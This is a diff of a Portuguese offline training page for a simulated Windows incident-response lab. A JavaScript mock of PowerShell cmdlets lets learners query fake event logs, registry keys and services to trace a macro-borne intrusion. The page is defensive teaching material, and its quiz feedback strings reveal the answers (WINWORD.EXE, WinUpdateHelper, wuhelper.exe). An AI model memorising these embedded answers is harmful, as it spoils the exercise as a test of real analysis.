+        if (!l) throw erro("Get-WinEvent : Não há logs de eventos que correspondam ao critério especificado: " + n);
+        return l;
+    }
+    var C = {
+        "get-winevent": function(a) {
+            var log = null, ids = null, max = null;
+            if (a.n.filterhashtable) {
+                var h = hashtable(valorDe(a.n.filterhashtable));
+                if (!h.logname) throw erro("Get-WinEvent : a hashtable precisa de LogName.");
+                log = logCanonico(h.logname[0]);
+                if (h.id) ids = h.id.map(Number);
+            } else {
+                var nome = a.n.logname ? valorDe(a.n.logname) : (a.p[0] && a.p[0].v);
+                if (!nome) throw erro("Get-WinEvent : informe -LogName ou -FilterHashtable.");
+                log = logCanonico(nome);
+            }
+            if (a.n.maxevents) max = Number(valorDe(a.n.maxevents));
+            var r = PS.eventos.filter(function(e) { return e.LogName === log && (!ids || ids.indexOf(e.Id) !== -1); })
+                .sort(function(x, y) { return x.TimeCreated < y.TimeCreated ? 1 : x.TimeCreated > y.TimeCreated ? -1 : 0; })
+                .map(function(e) { return obj("evento", e); });
+            if (!r.length) throw erro("Get-WinEvent : Nenhum evento foi encontrado que corresponda aos critérios de seleção especificados.");
+            return max ? r.slice(0, max) : r;
+        },
+        "get-itemproperty": function(a) {
+            var p = a.n.path ? valorDe(a.n.path) : (a.p[0] && a.p[0].v);
+            if (!p) throw erro("Get-ItemProperty : informe o caminho da chave.");
+            return lista(p).map(function(cam) {
+                var k = Object.keys(PS.registro).filter(function(x) { return x.toLowerCase() === cam.toLowerCase(); })[0];
+                if (!k) throw erro("Get-ItemProperty : Não é possível localizar o caminho '" + cam + "' porque ele não existe.");
+                var o = obj("registro", PS.registro[k]);
+                o.PSPath = "Microsoft.PowerShell.Core\\Registry::" + k.replace(":", "");
+                return o;
+            });
+        },
+        "get-service": function(a) {
+            var nome = a.p[0] && a.p[0].v;
+            var r = PS.servicos.filter(function(s) { return !nome || curinga(nome).test(s.Name); }).map(function(s) {
+                return obj("servico", { Status: s.Status, Name: s.Name, DisplayName: s.DisplayName, StartType: s.StartType });
+            });
+            if (!r.length) throw erro("Get-Service : Não é possível localizar nenhum serviço com o nome '" + nome + "'.");
+            return r;
+        },
+        "get-ciminstance": function(a) {
+            var cls = a.n.classname ? valorDe(a.n.classname) : (a.p[0] && a.p[0].v);
+            if (!cls || cls.toLowerCase() !== "win32_service") throw erro("Get-CimInstance : neste laboratório só a classe Win32_Service está disponível.");
+            return PS.servicos.map(function(s) { return obj("cim", { Name: s.Name, State: s.Status, StartMode: s.StartType === "Automatic" ? "Auto" : s.StartType, PathName: s.PathName, StartName: s.StartName }); });
+        },
+        "get-localuser": function() { return PS.usuarios.map(function(u) { return obj("usuario", u); }); },
+        "get-localgroupmember": function(a) {
+            var g = a.n.group ? valorDe(a.n.group) : (a.p[0] && a.p[0].v);
+            if (!g || ["administradores", "administrators"].indexOf(String(g).toLowerCase()) === -1) throw erro("Get-LocalGroupMember : neste laboratório use o grupo Administradores.");
+            return PS.membros_admin.map(function(m) { return obj("membro", m); });
+        },
+        "get-process": function() { return PS.processos.map(function(p) { return obj("processo", p); }); },
+        "get-nettcpconnection": function(a) {
+            var st = a.n.state ? String(valorDe(a.n.state)).toLowerCase() : null;
+            return PS.conexoes.filter(function(c) { return !st || c.State.toLowerCase() === st; }).map(function(c) { return obj("conexao", c); });
+        },
+        "where-object": function(a, ent) {
+            var f;
+            if (a.p[0] && a.p[0].bloco !== undefined) f = compilarBloco(a.p[0].bloco);
+            else {
+                var nome = a.n.property ? valorDe(a.n.property) : (a.p[0] && a.p[0].v);
+                var ops = Object.keys(a.n).filter(function(k) { return ["eq", "ne", "like", "notlike", "match", "notmatch", "gt", "lt", "ge", "le"].indexOf(k) !== -1; });
+                if (!nome || ops.length !== 1) throw erro("Where-Object : use { $_.Prop -eq 'valor' } ou Where-Object Prop -eq valor.");
+                var val = a.n[ops[0]] === true ? (a.p[1] && a.p[1].v) : valorDe(a.n[ops[0]]);
+                var lit = a.n[ops[0]].aspas ? val : literal(String(val));
+                f = function(o) { return comparar(prop(o, nome), "-" + ops[0], lit); };
+            }
+            return (ent || []).filter(function(o) { return f(o); });
+        },
+        "select-object": function(a, ent) {
+            var r = (ent || []).slice();
+            if (a.n.first) r = r.slice(0, Number(valorDe(a.n.first)));
+            if (a.n.last) r = r.slice(-Number(valorDe(a.n.last)));
+            if (a.n.expandproperty) {
+                var ep = valorDe(a.n.expandproperty);
+                return r.map(function(o) { var v = prop(o, ep); if (v === undefined) throw erro("Select-Object : A propriedade \"" + ep + "\" não pode ser encontrada."); return v; });
+            }
+            var ps = a.n.property ? lista(valorDe(a.n.property)) : a.p.reduce(function(acc, t) { return acc.concat(lista(t.v)); }, []);
+            if (!ps.length) return r;
+            return r.map(function(o) {
+                var nomes = ps.indexOf("*") !== -1 ? props(o) : ps;
+                var n = obj("selecao", {});
+                nomes.forEach(function(p) {
+                    var k = props(o).filter(function(x) { return x.toLowerCase() === p.toLowerCase(); })[0] || p;
+                    n[k] = prop(o, p) === undefined ? null : prop(o, p);
+                });
+                return n;
+            });
+        },
+        "sort-object": function(a, ent) {
+            var p = a.n.property ? valorDe(a.n.property) : (a.p[0] && a.p[0].v), desc = !!a.n.descending;
+            var r = (ent || []).map(function(o, i) { return { o: o, i: i }; });
+            r.sort(function(x, y) {
+                var va = p ? prop(x.o, p) : x.o, vb = p ? prop(y.o, p) : y.o, na = numero(va), nb = numero(vb), c;
+                if (!isNaN(na) && !isNaN(nb)) c = na - nb;
+                else c = texto(va).toLowerCase() < texto(vb).toLowerCase() ? -1 : texto(va).toLowerCase() > texto(vb).toLowerCase() ? 1 : 0;
+                return (desc ? -c : c) || x.i - y.i;
+            });
+            return r.map(function(x) { return x.o; });
+        },
+        "group-object": function(a, ent) {
+            var p = a.n.property ? valorDe(a.n.property) : (a.p[0] && a.p[0].v), mapa = {}, ordem = [];
+            (ent || []).forEach(function(o) {
+                var v = texto(p ? prop(o, p) : o), k = v.toLowerCase();
+                if (!mapa[k]) { mapa[k] = obj("grupo", { Count: 0, Name: v }); ordem.push(k); }
+                mapa[k].Count++;
+            });
+            return ordem.map(function(k) { return mapa[k]; });
+        },
+        "measure-object": function(a, ent) { return [obj("medida", { Count: (ent || []).length })]; },
+        "format-list": function(a, ent) {
+            var ps = a.p.reduce(function(acc, t) { return acc.concat(lista(t.v)); }, []);
+            return [{ _texto: formatarLista(ent || [], ps.length && ps[0] !== "*" ? ps : null) }];
+        },
+        "format-table": function(a, ent) {
+            var ps = a.p.reduce(function(acc, t) { return acc.concat(lista(t.v)); }, []);
+            return [{ _texto: formatarTabela(ent || [], ps.length ? ps : colunas(ent || [])) }];
+        },
+        "get-member": function(a, ent) {
+            if (!ent || !ent.length || typeof ent[0] !== "object") throw erro("Get-Member : Você deve especificar um objeto para o cmdlet Get-Member.");
+            var o = ent[0], linhas = ["", "   TypeName: " + (TIPOS[o._tipo] || "System.Management.Automation.PSCustomObject"), "", "Name" + pad("", 20) + "MemberType   Definition", "----" + pad("", 20) + "----------   ----------"];
+            props(o).forEach(function(p) { linhas.push(pad(p, 24) + "NoteProperty " + (typeof o[p] === "number" ? "int " : typeof o[p] === "boolean" ? "bool " : "string ") + p + "=" + texto(o[p]).slice(0, 40)); });
+            return [{ _texto: linhas }];
+        },
+        "get-command": function() {
+            return [{ _texto: ["", "CommandType     Name", "-----------     ----"].concat(CMDLETS.map(function(c) { return "Cmdlet          " + c; })) }];
+        },
+        "get-help": function(a) {
+            var n = a.p[0] && a.p[0].v;
+            if (!n) return [{ _texto: ["Use Get-Help <cmdlet>. Ex.: Get-Help Get-WinEvent, Get-Help Where-Object. Get-Command lista os cmdlets."] }];
+            var k = ALIASES[n.toLowerCase()] || n.toLowerCase();
+            return [{ _texto: (AJUDA[k] || "Sem ajuda detalhada para " + n + " neste laboratório.").split("\n") }];
+        }
+    };
+
+    // ------------------------------------------------------------ formatação
+    function pad(s, n) { s = String(s); while (s.length < n) s += " "; return s; }
+    function colunas(objs) {
+        var o = objs[0];
+        if (!o || typeof o !== "object") return [];
+        if (o._tipo && PADRAO[o._tipo]) return PADRAO[o._tipo];
+        return props(o);
+    }
+    function formatarTabela(objs, cols) {
+        var celula = function(v) { var s = texto(v).replace(/\s+/g, " "); return s.length > 60 ? s.slice(0, 57) + "..." : s; };
+        var larg = cols.map(function(c) { return Math.max(c.length, objs.reduce(function(m, o) { return Math.max(m, celula(prop(o, c)).length); }, 0)); });
+        var linhas = ["", cols.map(function(c, i) { return pad(c, larg[i]); }).join(" ").replace(/\s+$/, ""),
+            cols.map(function(c, i) { return pad(new Array(c.length + 1).join("-"), larg[i]); }).join(" ").replace(/\s+$/, "")];
+        objs.forEach(function(o) { linhas.push(cols.map(function(c, i) { return pad(celula(prop(o, c)), larg[i]); }).join(" ").replace(/\s+$/, "")); });
+        return linhas;
+    }
+    function formatarLista(objs, cols) {
+        var linhas = [];
+        objs.forEach(function(o) {
+            if (typeof o !== "object" || o === null) { linhas.push(texto(o)); return; }
+            var cs = cols || props(o), w = cs.reduce(function(m, c) { return Math.max(m, c.length); }, 0);
+            linhas.push("");
+            cs.forEach(function(c) { linhas.push(pad(c, w) + " : " + texto(prop(o, c))); });
+        });
+        return linhas;
+    }
+    function formatar(saida) {
+        if (!saida || !saida.length) return [];
+        if (saida.length === 1 && saida[0] && saida[0]._texto) return saida[0]._texto;
+        if (typeof saida[0] !== "object" || saida[0] === null) return saida.map(texto);
+        var cols = colunas(saida);
+        if (saida[0]._tipo === "registro" || saida[0]._tipo === "medida" || cols.length > 4 && !PADRAO[saida[0]._tipo]) return formatarLista(saida, null);
+        return formatarTabela(saida, cols);
+    }
+
+    function executar(linha) {
+        var segs = dividirPipeline(linha), saida = null;
+        segs.forEach(function(seg, i) {
+            if (!seg) throw erro("Um elemento vazio do pipeline não é permitido.");
+            var toks = tokens(seg), nome = toks[0].v || "";
+            var k = ALIASES[nome.toLowerCase()] || nome.toLowerCase();
+            if (!C[k]) throw erro(nome + " : O termo '" + nome + "' não é reconhecido como nome de cmdlet, função, arquivo de script ou programa operável.");
+            saida = C[k](parametros(toks.slice(1)), i === 0 ? null : saida);
+        });
+        return formatar(saida);
+    }
+
+    // ------------------------------------------------------------ console
+    function escrever(t, cor) {
+        var c = document.getElementById("ps-console");
+        c.appendChild(el("div", t === "" ? " " : t, cor ? "color: " + cor + ";" : null));
+        while (c.childNodes.length > 800) c.removeChild(c.firstChild);
+        c.scrollTop = c.scrollHeight;
+    }
+    window.executarComandoPowerShell = function(cmd) {
+        cmd = String(cmd).trim();
+        if (!cmd) return "";
+        historico.push(cmd);
+        posHist = historico.length;
+        escrever("PS C:\\> " + cmd, "#fde68a");
+        var k = (ALIASES[cmd.toLowerCase()] || cmd.toLowerCase());
+        if (k === "clear-host") { document.getElementById("ps-console").replaceChildren(); return ""; }
+        try {
+            var out = executar(cmd);
+            out.forEach(function(l) { escrever(l); });
+            return out.join("\n");
+        } catch (e) {
+            if (!e.ps) throw e;
+            escrever(e.message, "#fca5a5");
+            return e.message;
+        }
+    };
+    function enviar() {
+        var inp = document.getElementById("ps-entrada");
+        executarComandoPowerShell(inp.value);
+        inp.value = "";
+        inp.focus();
+    }
+
+    // ------------------------------------------------------------ perguntas
+    var PERGUNTAS = [
+        { id: "processo_pai", texto: "Qual programa abriu o PowerShell malicioso? (o acesso inicial)",
+          normalizar: function(v) { return v.toLowerCase().replace(/^.*\\/, "").replace(/\.exe$/, ""); },
+          ok: "Correto: o Word (WINWORD.EXE) abriu o PowerShell com -enc às 09:41:07, logo depois de abrir Fatura_Novembro.docm. É um anexo com macro (T1566.001).",
+          dica: "Filtre os eventos 1 do Sysmon e olhe a ParentImage do powershell.exe que tem -enc na linha de comando." },
+        { id: "destino", texto: "Para qual IP e porta o PowerShell malicioso se conectou? (formato IP:porta)",
+          normalizar: function(v) { return v.trim().replace(/\s+/, ":"); },
+          ok: "Correto: o evento 3 do Sysmon do mesmo ProcessId (6410) mostra a conexão; o 4104 confirma o download de a.ps1 desse endereço.",
+          dica: "Filtre os eventos 3 do Sysmon e compare o ProcessId com o do PowerShell malicioso." },
+        { id: "conta", texto: "Qual conta local foi criada?",
+          normalizar: function(v) { return v.trim().toLowerCase().replace(/^.*\\/, ""); },
+          ok: "Correto: o 4720 registra a criação e o 4732 mostra a inclusão em Administradores, ambos pelo processo net.exe filho do PowerShell.",
+          dica: "Procure o evento 4720 no log Security." },
+        { id: "run", texto: "Qual valor da chave Run é a persistência do invasor?",
+          normalizar: function(v) { return v.trim().toLowerCase(); },
+          ok: "Correto: WinUpdateHelper no HKCU aponta para C:\\Users\\Public\\wuhelper.exe; o mesmo binário foi instalado como serviço (7045), rodando como LocalSystem.",
+          dica: "Leia as chaves Run do HKLM e do HKCU e compare com o que é conhecido: SecurityHealth, AgenteGestorTI e OneDrive são legítimos." }
+    ];
+    function renderizarPerguntas() {
+        var box = document.getElementById("ps-perguntas");
+        box.replaceChildren();
+        PERGUNTAS.forEach(function(p, i) {
+            var d = el("div");
+            var rot = el("label", (i + 1) + ". " + p.texto, "display: block; margin-bottom: 0.3rem; font-weight: 600;");
+            rot.setAttribute("for", "ps-q-" + p.id);
+            d.appendChild(rot);
+            var linha = el("div", null, "display: flex; gap: 0.5rem; flex-wrap: wrap;");
+            var inp = el("input", null, "flex: 1 1 200px; min-width: 0;");
+            inp.className = "form-control"; inp.type = "text"; inp.id = "ps-q-" + p.id; inp.autocomplete = "off";
+            var b = el("button", "Verificar");
+            b.type = "button"; b.className = "btn-secondary";
+            b.addEventListener("click", function() { verificarPerguntaPowerShell(i + 1); });
+            linha.appendChild(inp); linha.appendChild(b);
+            d.appendChild(linha);
+            var r = el("p", null, "margin: 0.3rem 0 0 0;"); r.id = "ps-r-" + p.id;
+            d.appendChild(r);
+            box.appendChild(d);
+        });
+    }
+    window.verificarPerguntaPowerShell = function(n) {
+        var p = PERGUNTAS[n - 1];
+        if (!p) return;
+        var v = document.getElementById("ps-q-" + p.id).value, ok = p.normalizar(v) === p.normalizar(PS.respostas[p.id]);
+        var r = document.getElementById("ps-r-" + p.id);
+        r.textContent = ok ? "✓ " + p.ok : "✗ Ainda não. " + p.dica;
+        r.style.color = ok ? "var(--tip-color)" : "var(--danger-color)";
+        r.setAttribute("data-ok", ok ? "sim" : "nao");
+    };
+
+    window.restaurarPowerShell = function() {
+        historico = []; posHist = 0;
+        document.getElementById("ps-console").replaceChildren();
+        escrever("Windows PowerShell (laboratório) — host " + PS.host + ". Digite Get-Command ou Get-Help <cmdlet>.", "#93c5fd");
+        PERGUNTAS.forEach(function(p) { document.getElementById("ps-q-" + p.id).value = ""; document.getElementById("ps-r-" + p.id).textContent = ""; });
+    };
+
+    document.addEventListener("DOMContentLoaded", function() {
+        document.getElementById("ps-contexto").textContent = PS.contexto;
+        renderizarPerguntas();
+        var inp = document.getElementById("ps-entrada");
+        inp.addEventListener("keydown", function(e) {
+            if (e.key === "Enter") { e.preventDefault(); enviar(); }
+            else if (e.key === "ArrowUp" && historico.length) { e.preventDefault(); posHist = Math.max(0, posHist - 1); inp.value = historico[posHist]; }
+            else if (e.key === "ArrowDown" && historico.length) { e.preventDefault(); posHist = Math.min(historico.length, posHist + 1); inp.value = historico[posHist] || ""; }
+        });
+        document.getElementById("ps-executar").addEventListener("click", enviar);
+        var box = document.getElementById("ps-atalhos");
+        ATALHOS.forEach(function(c) {
+            var b = el("button", c, "font-family: var(--font-mono); font-size: 0.7rem; padding: 0.2rem 0.5rem; text-align: left; overflow-wrap: anywhere;");
+            b.type = "button"; b.className = "btn-secondary";
+            b.addEventListener("click", function() { executarComandoPowerShell(c); });
+            box.appendChild(b);
+        });
+        restaurarPowerShell();
+        if (typeof initChecklist === "function") {
+            initChecklist("powershell-windows");
+        }
+        if (typeof initQuiz === "function") {
+            initQuiz();
+        }
+    });
+})();
+</script>
+    <footer class="study-footer">
+      <p>&copy; 2026 Estudos em Cibersegurança &bull; Material Autoinstrucional e Prático 100% Offline</p>
+      <p><a href="../index.html">← Painel de Estudos</a> &bull; Curadoria e Desenvolvimento por José Mauro da Silva Brandão</p>
+    </footer>
+  </main>
+
+  <!-- Scripts Interativos Embutidos -->
+  <script>
+/**
+ * ============================================================================
+ * ESTUDOS DE CIBERSEGURANÇA — BIBLIOTECA BASE COMPARTILHADA (base.js)
+ * Utilitários reativos, persistência local segura, acessibilidade e interatividade.
+ * Vanilla JavaScript (Zero dependências externas, 100% offline-ready).
+ * ============================================================================
+ */
+
+(function (window, document) {
+  'use strict';
+
+  // --------------------------------------------------------------------------
+  // 0. Utilitários Seguros de Armazenamento Local (localStorage)
+  // --------------------------------------------------------------------------
+  function safeStorageGet(key) {
+    try {
+      if (typeof window !== 'undefined' && window.localStorage) {
+        return window.localStorage.getItem(key);
+      }
+    } catch (e) {
+      console.warn(`[CS] Falha ao ler localStorage chave "${key}":`, e);
+    }
+    return null;
+  }
+
+  function safeStorageSet(key, value) {
+    try {
+      if (typeof window !== 'undefined' && window.localStorage) {
+        window.localStorage.setItem(key, String(value));
+        return true;
+      }
+    } catch (e) {
+      console.warn(`[CS] Falha ao gravar localStorage chave "${key}":`, e);
+    }
+    return false;
+  }
+
+  // --------------------------------------------------------------------------
+  // 1. Gerenciamento de Tema (Claro / Escuro)
+  // --------------------------------------------------------------------------
+  const THEME_STORAGE_KEY = 'cs_theme';
+
+  function applyTheme(theme) {
+    if (theme === 'dark') {
+      document.documentElement.setAttribute('data-theme', 'dark');
+    } else if (theme === 'light') {
+      document.documentElement.setAttribute('data-theme', 'light');
+    } else {
+      document.documentElement.removeAttribute('data-theme');
+    }
+    updateThemeButtons(theme);
+  }
+
+  function getSystemTheme() {
+    return window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+      ? 'dark'
+      : 'light';
+  }
+
+  function getCurrentTheme() {
+    const saved = safeStorageGet(THEME_STORAGE_KEY);
+    return saved || getSystemTheme();
+  }
+
+  function updateThemeButtons(currentTheme) {
+    const effectiveTheme = currentTheme === 'dark' || (!currentTheme && getSystemTheme() === 'dark') ? 'dark' : 'light';
+    const buttons = document.querySelectorAll('.theme-toggle-btn, [data-theme-toggle]');
+    buttons.forEach((btn) => {
+      btn.setAttribute('aria-label', effectiveTheme === 'dark' ? 'Alternar para tema claro' : 'Alternar para tema escuro');
+      btn.innerHTML = effectiveTheme === 'dark'
+        ? '<span class="theme-icon">☀️</span> <span class="theme-label">Claro</span>'
+        : '<span class="theme-icon">🌙</span> <span class="theme-label">Escuro</span>';
+    });
+  }
+
+  function toggleTheme() {
+    const current = getCurrentTheme();
+    const next = current === 'dark' ? 'light' : 'dark';
+    safeStorageSet(THEME_STORAGE_KEY, next);
+    applyTheme(next);
+    return next;
+  }
+
+  function initTheme() {
+    const saved = safeStorageGet(THEME_STORAGE_KEY);
+    if (saved) {
+      applyTheme(saved);
+    } else {
+      updateThemeButtons(getSystemTheme());
+    }
+
+    // Monitora preferência do sistema operacional caso usuário não tenha fixado
+    if (window.matchMedia) {
+      window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', (e) => {
+        if (!safeStorageGet(THEME_STORAGE_KEY)) {
+          updateThemeButtons(e.matches ? 'dark' : 'light');
+        }
+      });
+    }
+
+    // Vincula cliques em botões de tema
+    document.querySelectorAll('.theme-toggle-btn, [data-theme-toggle]').forEach((btn) => {
+      btn.onclick = toggleTheme;
+    });
+  }
+
+  // --------------------------------------------------------------------------
+  // 2. Checklist Operacional Interativo & Status de Conclusão de Estudo
+  // --------------------------------------------------------------------------
+  function extractSlug() {
+    if (document.body && document.body.dataset && document.body.dataset.slug) {
+      return document.body.dataset.slug;
+    }
+    const metaSlug = document.querySelector('meta[name="study-slug"]');
+    if (metaSlug && metaSlug.content) {
+      return metaSlug.content;
+    }
+    // Fallback: tenta obter do pathname
+    const match = window.location.pathname.match(/treinamento-([^.]+)\.html/);
+    if (match) {
+      return match[1];
+    }
+    return 'default';
+  }
+
+  function updateChecklistProgress(checklistEl) {
+    const checkboxes = checklistEl.querySelectorAll('input[type="checkbox"]');
+    if (!checkboxes.length) return;
+
+    let checkedCount = 0;
+    checkboxes.forEach((cb) => {
+      if (cb.checked) checkedCount++;
+    });
+
+    const progressFill = checklistEl.querySelector('.checklist-progress-fill');
+    if (progressFill) {
+      const pct = Math.round((checkedCount / checkboxes.length) * 100);
+      progressFill.style.width = `${pct}%`;
+    }
+
+    const counterEl = checklistEl.querySelector('.checklist-counter');
+    if (counterEl) {
+      counterEl.textContent = `${checkedCount} de ${checkboxes.length} itens auditados`;
+    }
+  }
+
+  function initChecklist(slug) {
+    const activeSlug = slug || extractSlug();
+    const checklists = document.querySelectorAll('.checklist');
+
+    checklists.forEach((checklist, listIdx) => {
+      const listId = checklist.dataset.checklistId || `list_${listIdx}`;
+      const items = checklist.querySelectorAll('.check-item');
+
+      items.forEach((item, itemIdx) => {
+        const checkbox = item.querySelector('input[type="checkbox"]');
+        if (!checkbox) return;
+
+        const itemId = checkbox.id || checkbox.getAttribute('data-id') || `${listId}_${itemIdx}`;
+        const storageKey = `cs_check_${activeSlug}_${itemId}`;
+
+        // Restaura estado
+        const savedState = safeStorageGet(storageKey);
+        if (savedState === 'true') {
+          checkbox.checked = true;
+          item.classList.add('completed');
+        } else {
+          checkbox.checked = false;
+          item.classList.remove('completed');
+        }
+
+        // Event listener
+        checkbox.onchange = function () {
+          safeStorageSet(storageKey, checkbox.checked ? 'true' : 'false');
+          if (checkbox.checked) {
+            item.classList.add('completed');
+          } else {
+            item.classList.remove('completed');
+          }
+          updateChecklistProgress(checklist);
+        };
+      });
+
+      updateChecklistProgress(checklist);
+    });
+  }
+
+  function isStudyDone(slug) {
+    const activeSlug = slug || extractSlug();
+    return safeStorageGet(`cs_done_${activeSlug}`) === 'true';
+  }
+
+  function setStudyDone(slug, isDone) {
+    const activeSlug = slug || extractSlug();
+    const doneValue = isDone !== false;
+    return safeStorageSet(`cs_done_${activeSlug}`, doneValue ? 'true' : 'false');
+  }
+
+  // --------------------------------------------------------------------------
+  // 3. Sistema de Quiz com Feedback Explicativo
+  // --------------------------------------------------------------------------
+  function checkQuiz(btn, isCorrect, explanation) {
+    const quizItem = btn.closest('.quiz-item');
+    if (!quizItem) return;
+
+    // Desabilita botões para registrar a tentativa
+    const buttons = quizItem.querySelectorAll('.quiz-btn');
+    buttons.forEach((b) => {
+      b.disabled = true;
+      b.classList.remove('selected');
+    });
+
+    // Destaca o botão clicado
+    btn.classList.add('selected');
+    if (isCorrect) {
+      btn.classList.add('correct');
+    } else {
+      btn.classList.add('incorrect');
+    }
+
+    // Exibe ou atualiza o painel de feedback
+    let feedbackEl = quizItem.querySelector('.quiz-feedback');
+    if (!feedbackEl) {
+      feedbackEl = document.createElement('div');
+      feedbackEl.className = 'quiz-feedback';
+      quizItem.appendChild(feedbackEl);
+    }
+
+    feedbackEl.className = `quiz-feedback ${isCorrect ? 'correct' : 'incorrect'}`;
+    const icon = isCorrect ? '✅' : '❌';
+    const statusText = isCorrect ? 'Correto!' : 'Incorreto.';
+    feedbackEl.innerHTML = `<strong>${icon} ${statusText}</strong> ${escapeHtml(explanation || '')}`;
+    feedbackEl.style.display = 'block';
+  }
+
+  function initQuiz() {
+    const quizItems = document.querySelectorAll('.quiz-item');
+    quizItems.forEach((quiz, idx) => {
+      const qId = quiz.dataset.quizId || `quiz_${idx}`;
+      quiz.setAttribute('data-initialized', 'true');
+    });
+  }
+
+  // --------------------------------------------------------------------------
+  // 4. Copiar Código para Área de Transferência
+  // --------------------------------------------------------------------------
+  function copyCode(button, targetId) {
+    let textToCopy = '';
+
+    if (targetId) {
+      const targetEl = document.getElementById(targetId);
+      if (targetEl) {
+        textToCopy = targetEl.innerText || targetEl.textContent;
+      }
+    } else if (button) {
+      const terminalBox = button.closest('.terminal-box') || button.parentElement;
+      const codeEl = terminalBox ? terminalBox.querySelector('pre code, pre, code') : null;
+      if (codeEl) {
+        textToCopy = codeEl.innerText || codeEl.textContent;
+      }
+    }
+
+    if (!textToCopy) return;
+
+    const originalText = button ? button.innerText : 'Copiar';
+
+    function setSuccess() {
+      if (button) {
+        button.innerText = '✓ Copiado!';
+        button.classList.add('copied');
+        setTimeout(() => {
+          button.innerText = originalText;
+          button.classList.remove('copied');
+        }, 2000);
+      }
+    }
+
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(textToCopy.trim()).then(setSuccess).catch(() => {
+        fallbackCopy(textToCopy.trim(), setSuccess);
+      });
+    } else {
+      fallbackCopy(textToCopy.trim(), setSuccess);
+    }
+  }
+
+  function fallbackCopy(text, callback) {
+    if (!document.body) {
+      console.warn('document.body não está pronto para cópia via textarea.');
+      return;
+    }
+
+    const textarea = document.createElement('textarea');
+    textarea.value = text;
+    textarea.style.position = 'fixed';
+    textarea.style.opacity = '0';
+    document.body.appendChild(textarea);
+    textarea.select();
+    try {
+      const successful = document.execCommand('copy');
+      if (successful && callback) {
+        callback();
+      }
+    } catch (e) {
+      console.warn('Falha ao copiar texto:', e);
+    } finally {
+      if (textarea.parentNode) {
+        textarea.parentNode.removeChild(textarea);
+      }
+    }
+  }
+
+  // --------------------------------------------------------------------------
+  // 5. Utilitários Reutilizáveis para Simuladores e Laboratórios
+  // --------------------------------------------------------------------------
+  function escapeHtml(str) {
+    if (str === null || str === undefined) return '';
+    return String(str)
+      .replace(/&/g, '&amp;')
+      .replace(/</g, '&lt;')
+      .replace(/>/g, '&gt;')
+      .replace(/"/g, '&quot;')
+      .replace(/'/g, '&#39;');
+  }
+
+  function formatBytes(bytes, decimals = 2) {
+    if (!+bytes || bytes < 0) return '0 Bytes';
+    const k = 1024;
+    const dm = decimals < 0 ? 0 : decimals;
+    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB', 'PB'];
+    const i = Math.floor(Math.log(bytes) / Math.log(k));
+    return `${parseFloat((bytes / Math.pow(k, i)).toFixed(dm))} ${sizes[i]}`;
+  }
+
+  function formatNumber(num) {
+    if (isNaN(num)) return '0';
+    return new Intl.NumberFormat('pt-BR').format(num);
+  }
+
+  function bytesToHex(uint8Array) {
+    return Array.from(uint8Array)
+      .map((b) => b.toString(16).padStart(2, '0'))
+      .join('');
+  }
+
+  function hexToBytes(hexString) {
+    let cleaned = String(hexString || '').replace(/\s+/g, '');
+    if (cleaned.length % 2 !== 0) {
+      cleaned = '0' + cleaned;
+    }
+    const bytes = new Uint8Array(cleaned.length / 2);
+    for (let i = 0; i < cleaned.length; i += 2) {
+      bytes[i / 2] = parseInt(cleaned.substring(i, i + 2), 16);
+    }
+    return bytes;
+  }
+
+  async function sha256Hex(message) {
+    if (!window.crypto || !window.crypto.subtle) {
+      throw new Error('Web Cryptography API não suportada neste ambiente.');
+    }
+    const msgUint8 = new TextEncoder().encode(message);
+    const hashBuffer = await window.crypto.subtle.digest('SHA-256', msgUint8);
+    const hashArray = Array.from(new Uint8Array(hashBuffer));
+    return hashArray.map((b) => b.toString(16).padStart(2, '0')).join('');
+  }
+
+  // --------------------------------------------------------------------------
+  // 6. Exposição Global de Funções & Inicialização Automática
+  // --------------------------------------------------------------------------
+  window.safeStorageGet = safeStorageGet;
+  window.safeStorageSet = safeStorageSet;
+  window.initTheme = initTheme;
+  window.toggleTheme = toggleTheme;
+  window.initChecklist = initChecklist;
+  window.isStudyDone = isStudyDone;
+  window.setStudyDone = setStudyDone;
+  window.initQuiz = initQuiz;
+  window.checkQuiz = checkQuiz;
+  window.copyCode = copyCode;
+  window.escapeHtml = escapeHtml;
+  window.formatBytes = formatBytes;
+  window.formatNumber = formatNumber;
+  window.bytesToHex = bytesToHex;
+  window.hexToBytes = hexToBytes;
+  window.sha256Hex = sha256Hex;
+
+  // Namespace unificado
+  window.CS = {
+    safeStorageGet,
+    safeStorageSet,
+    initTheme,
+    toggleTheme,
+    initChecklist,
+    isStudyDone,
+    setStudyDone,
+    initQuiz,
+    checkQuiz,
+    copyCode,
+    escapeHtml,
+    formatBytes,
+    formatNumber,
+    bytesToHex,
+    hexToBytes,
+    sha256Hex,
+  };
+
+  // Auto-inicialização na carga do DOM
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', () => {
+      initTheme();
+      initChecklist();
+      initQuiz();
+    });
+  } else {
+    initTheme();
+    initChecklist();
+    initQuiz();
+  }
+})(window, document);
+
+  </script>
+</body>
+</html>
